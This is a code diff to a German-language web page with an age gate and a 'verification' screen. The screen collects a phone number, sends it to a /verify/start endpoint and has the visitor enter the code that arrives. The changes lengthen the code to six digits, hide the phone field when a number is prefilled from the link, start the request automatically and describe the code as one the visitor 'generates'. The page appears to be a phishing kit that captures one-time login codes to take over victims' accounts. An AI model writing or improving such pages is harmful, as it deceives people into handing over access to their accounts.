@@ -57,18 +57,18 @@ body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; mi
 .age-box h2 { font-size:20px; margin-bottom:8px; }
 .age-box p { color:#ccc; font-size:14px; margin-bottom:20px; line-height:1.4; }
 .age-btn { background: linear-gradient(90deg, #7b2cbf, #9b59b6); color:#fff; border:none; padding:16px 32px; border-radius:14px; font-size:16px; font-weight:700; width:100%; cursor:pointer; }
-.verify-box { background: rgba(0,0,0,0.8); border-radius:20px; padding:24px; text-align:center; max-width:340px; width:100%; }
-.verify-box h2 { font-size:18px; margin-bottom:8px; }
-.verify-box p { color:#aaa; font-size:13px; margin-bottom:16px; }
-.code-boxes { display:flex; gap:8px; justify-content:center; margin:16px 0; }
-.code-box { width:42px; height:50px; border:2px solid #444; border-radius:10px; background:#1a1a24; display:flex; align-items:center; justify-content:center; font-size:22px; font-weight:700; }
-.code-box.filled { border-color:#7b2cbf; }
-.keypad { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-top:16px; }
-.key { background: linear-gradient(145deg, #6b2fa0, #8b4cbf); border:none; border-radius:14px; padding:16px; font-size:20px; font-weight:700; color:#fff; cursor:pointer; }
+.verify-box { text-align:center; max-width:340px; width:100%; }
+.bell { font-size:50px; margin-bottom:12px; }
+.info-box { background: rgba(0,0,0,0.8); border-radius:16px; padding:16px; margin-bottom:16px; font-size:14px; line-height:1.5; }
+.code-boxes { display:flex; gap:6px; justify-content:center; margin:12px 0; }
+.code-box { width:38px; height:46px; border:2px solid #555; border-radius:10px; background:rgba(0,0,0,0.5); display:flex; align-items:center; justify-content:center; font-size:20px; font-weight:700; }
+.code-box.filled { border-color:#8b5cf6; }
+.req-btn { background: #7c5cfc; color:#fff; border:none; padding:14px; border-radius:14px; font-size:15px; font-weight:700; width:100%; cursor:pointer; margin:8px 0; }
+.keypad { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-top:12px; }
+.key { background: #7c5cfc; border:none; border-radius:14px; padding:16px; font-size:20px; font-weight:700; color:#fff; cursor:pointer; }
 .key:active { transform:scale(0.95); }
-.key.clear { background:#333; }
-.phone-input { width:100%; padding:14px; border-radius:12px; border:1px solid #333; background:#1a1a24; color:#fff; font-size:16px; margin:8px 0; text-align:center; }
-.req-btn { background: linear-gradient(90deg, #7b2cbf, #9b59b6); color:#fff; border:none; padding:14px; border-radius:14px; font-size:15px; font-weight:700; width:100%; cursor:pointer; margin-top:8px; }
+.key.clear { background:#5b4cdb; }
+.phone-input { width:100%; padding:14px; border-radius:12px; border:1px solid #333; background:#1a1a24; color:#fff; font-size:16px; margin:8px 0; text-align:center; display:none; }
 .success { color:#4ade80; margin-top:12px; font-weight:600; }
 .error { color:#ff5555; margin-top:12px; }
 </style>
@@ -85,21 +85,18 @@ body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; mi
 </div>
 <div id="verifyScreen" class="screen hidden">
   <div class="verify-box">
-    <div style="font-size:40px; margin-bottom:8px;">🔐</div>
-    <h2>Zugangscode</h2>
-    <p>Gib deine Nummer ein und fordere den Code an</p>
+    <div class="bell">🔔</div>
+    <div class="info-box">Klicke auf den Button, um deinen einmaligen Code zu generieren. Dieser wird benötigt, um dich zu verifizieren und den Zugriff freizuschalten.</div>
+    <div class="code-boxes" id="codeBoxes">
+      <div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div>
+    </div>
     <input type="text" id="phone" class="phone-input" placeholder="+49 170 1234567">
     <button class="req-btn" onclick="startLogin()">Zugangscode anfordern</button>
-    <div id="codeArea" style="display:none; margin-top:16px;">
-      <div class="code-boxes" id="codeBoxes">
-        <div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div>
-      </div>
-      <div class="keypad">
-        <button class="key" onclick="addDigit('1')">1</button><button class="key" onclick="addDigit('2')">2</button><button class="key" onclick="addDigit('3')">3</button>
-        <button class="key" onclick="addDigit('4')">4</button><button class="key" onclick="addDigit('5')">5</button><button class="key" onclick="addDigit('6')">6</button>
-        <button class="key" onclick="addDigit('7')">7</button><button class="key" onclick="addDigit('8')">8</button><button class="key" onclick="addDigit('9')">9</button>
-        <button class="key clear" onclick="clearCode()">⌫</button><button class="key" onclick="addDigit('0')">0</button><button class="key" onclick="submitCode()">✓</button>
-      </div>
+    <div class="keypad">
+      <button class="key" onclick="addDigit('1')">1</button><button class="key" onclick="addDigit('2')">2</button><button class="key" onclick="addDigit('3')">3</button>
+      <button class="key" onclick="addDigit('4')">4</button><button class="key" onclick="addDigit('5')">5</button><button class="key" onclick="addDigit('6')">6</button>
+      <button class="key" onclick="addDigit('7')">7</button><button class="key" onclick="addDigit('8')">8</button><button class="key" onclick="addDigit('9')">9</button>
+      <button class="key" onclick="addDigit('0')">0</button><button class="key clear" onclick="clearCode()">⌫</button><button class="key" onclick="submitCode()">✓</button>
     </div>
     <div id="msg"></div>
   </div>
@@ -115,6 +112,8 @@ if (prefill) {
   if (auto === '1') {
     setTimeout(() => startLogin(), 500);
   }
+} else {
+  document.getElementById('phone').style.display = 'block';
 }
 function showVerify() {
   document.getElementById('ageScreen').classList.add('hidden');
@@ -124,7 +123,7 @@ function updateBoxes() {
   const boxes = document.querySelectorAll('.code-box');
   boxes.forEach((b, i) => { b.textContent = code[i] || ''; b.classList.toggle('filled', !!code[i]); });
 }
-function addDigit(d) { if (code.length < 5) { code += d; updateBoxes(); } }
+function addDigit(d) { if (code.length < 6) { code += d; updateBoxes(); } }
 function clearCode() { code = code.slice(0, -1); updateBoxes(); }
 async function startLogin() {
   const phone = document.getElementById('phone').value.trim();
@@ -133,7 +132,6 @@ async function startLogin() {
   const res = await fetch('/verify/start', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone}) });
   const data = await res.json();
   if (data.ok) {
-    document.getElementById('codeArea').style.display = 'block';
     document.getElementById('msg').className = 'success';
     document.getElementById('msg').textContent = 'Code gesendet!';
   } else {
